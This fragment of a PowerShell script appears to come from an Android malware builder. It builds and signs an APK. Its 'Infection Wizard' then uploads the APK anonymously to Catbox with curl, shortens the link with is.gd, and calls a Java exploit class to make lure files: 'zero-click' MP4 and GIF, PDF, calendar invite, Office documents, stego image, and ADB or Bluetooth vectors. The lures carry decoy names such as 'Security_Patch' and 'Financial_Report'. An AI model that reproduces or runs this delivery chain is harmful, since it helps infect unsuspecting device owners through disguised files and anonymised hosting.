        $outputDir = Join-Path $ScriptDir "output"
        Set-Location $outputDir
        Write-Host "[✓] Engine Ready. Producing payload..." -ForegroundColor Green
        & java -cp $tempBin com.labs.labrats.exploits.ExploitLab $Type $Url $Extra
        Set-Location $ScriptDir
    } else {
        Write-Host "[!] Exploit compilation failed. Check build_log.txt" -ForegroundColor Red
    }
}

function Invoke-InfectionWizard {
    Write-Banner
    Write-Host "[>] STRATEGIC_INFECTION_WIZARD" -ForegroundColor Red
    Write-Host "    Step-by-step automated payload weaponization." -ForegroundColor Yellow
    Write-Host ""

    # Build sequence
    if (-not (Test-Requirements)) { return }
    New-Keystore -AutoGenerate $true
    Set-Logo
    Set-AppConfig
    Build-Apk

    $outputDir = Join-Path $ScriptDir "output"
    $signedApk = Get-ChildItem -Path $outputDir -Filter "*-signed.apk" | Select-Object -First 1

    if (-not $signedApk) {
        Write-Host "[!] Build failed. Infection chain aborted." -ForegroundColor Red
        Read-Host "Press Enter to return..."
        return
    }

    Write-Host ""
    Write-Host "[HOSTING] Select strategy:" -ForegroundColor Cyan
    Write-Host "    1. Anonymous Cloud (Catbox)  2. Direct IP (IPv6)"
    $h = Read-Host "    Choice"

    $downloadUrl = ""
    if ($h -eq "2") {
        $ip = Read-Host "    Target IPv6"
        $downloadUrl = "http://[$ip]:9191/download/Update.apk"
    } else {
        Write-Host "[*] Uploading to Catbox.moe..." -ForegroundColor Yellow
        $resp = curl.exe -sS -F "reqtype=fileupload" -F "fileToUpload=@$($signedApk.FullName)" https://catbox.moe/user/api.php
        if ($resp -match "http") {
            $downloadUrl = $resp.Trim()
            Write-Host "[✓] Hosted: $downloadUrl" -ForegroundColor Green

            Write-Host "[*] Shortening delivery URL..." -ForegroundColor Yellow
            $short = curl.exe -s "https://is.gd/create.php?format=simple&url=$downloadUrl"
            if ($short -match "http") {
                $downloadUrl = $short.Trim()
                Write-Host "[✓] Shortened: $downloadUrl" -ForegroundColor Green
            }
        } else {
            Write-Host "[!] Upload failed: $resp" -ForegroundColor Red
            return
        }
    }

    Write-Host ""
    Write-Host "[WEAPONIZE] Select Vector:" -ForegroundColor Cyan
    Write-Host "    1. Zero-Click MP4  2. Stealth PDF  3. Meeting Invite"
    Write-Host "    4. Dolby Audio     5. ADB Script    6. Bluetooth/NFC"
    Write-Host "    7. Stego Image     8. PWA Bundle    9. Office Word"
    Write-Host "    10. Office Excel   11. Ghost GIF (Zero-Click)"
    $v = Read-Host "    Choice"

    switch ($v) {
        "1" { New-ExploitStandalone "mp4" $downloadUrl "" }
        "2" { New-ExploitStandalone "pdf" $downloadUrl "Security_Audit" }
        "3" { New-ExploitStandalone "ics" $downloadUrl "Security_Sync" }
        "4" { New-ExploitStandalone "dolby" $downloadUrl "" }
        "5" { $tip = Read-Host "    Target IP"; New-ExploitStandalone "adb" $downloadUrl $tip }
        "6" { New-ExploitStandalone "vcf" $downloadUrl "System_Update" }
        "7" { New-ExploitStandalone "stego" $downloadUrl "" }
        "8" { New-ExploitStandalone "pwa" $downloadUrl "System_Update" }
        "9" { New-ExploitStandalone "docx" $downloadUrl "Security_Patch" }
        "10" { New-ExploitStandalone "xlsx" $downloadUrl "Financial_Report" }
        "11" { New-ExploitStandalone "gif" $downloadUrl "" }
        default { Write-Host "[!] Invalid Choice" -ForegroundColor Red }
    }

    Write-Host "`nDEPLOYMENT PACKAGE READY: $downloadUrl" -ForegroundColor Green
    Write-Host "[INFO] Check output directory for payloads." -ForegroundColor Cyan
    Read-Host "Press Enter to return..."
}

function Show-MainMenu {
    Write-Banner
    
    Write-Host "[>] Build Options:" -ForegroundColor Magenta
    Write-Host ""
    Write-Host "    1. Start Build (Configure & Build)"
    Write-Host "    2. Generate Keystore Only"
    Write-Host "    3. Configure Logo Only"
    Write-Host "    4. Configure App Settings Only"
    Write-Host "    5. Check/Install Requirements"
    Write-Host "    6. Generate Infection Chain Package (Wizard)"
    Write-Host "    7. Help / Documentation"
    Write-Host "    8. Exit"
    Write-Host ""
    
    $option = Read-Host "    Choose option (Default 1)"
    if ([string]::IsNullOrEmpty($option)) { $option = "1" }
    
    Write-Host ""
    
    switch ($option) {
        "1" {
            if (Test-Requirements) {
                New-Keystore
                Set-Logo
                Set-AppConfig
                Build-Apk
            }
        }
        "2" {
            if (Test-Requirements) {
                New-Keystore
            }
        }
        "3" {
            Set-Logo
        }
        "4" {
            Set-AppConfig
        }
        "5" {
            Test-Requirements | Out-Null
            Show-ManualJavaInstall
            Read-Host "Press Enter to return to menu"
        }
        "6" {
            Invoke-InfectionWizard
        }
        "7" {
            # Documentation
            Write-Banner
            Write-Host "COMMAND_DOCUMENTATION_V1.5.0" -ForegroundColor White
            Write-Host "------------------------------------------------------------"
            Write-Host "1. Start Build: Standard production flow."
            Write-Host "2. Keystore Only: Unique signing certificate."
            Write-Host "3. Logo Only: Change app icons."
            Write-Host "4. App Settings: Change ID, Name, and Version."
            Write-Host "5. Requirements: Check Java setup."
            Write-Host "6. Infection Wizard: Full Build -> Host -> Weaponize."
            Write-Host "------------------------------------------------------------"
            Read-Host "Press Enter..."
        }
        "8" {
            Write-Host "[*] Goodbye!" -ForegroundColor Cyan
            Write-Host "    Follow: https://github.com/K4N3CO/Lab-STAR" -ForegroundColor Magenta
            return
        }
        default {
            Write-Host "[!] Invalid option" -ForegroundColor Red
        }
    }
    
    Write-Host ""
    Write-Host "[OK] Done!" -ForegroundColor Green
    Write-Host ""
    Read-Host "Press Enter to exit"
}

# Run main menu
Show-MainMenu
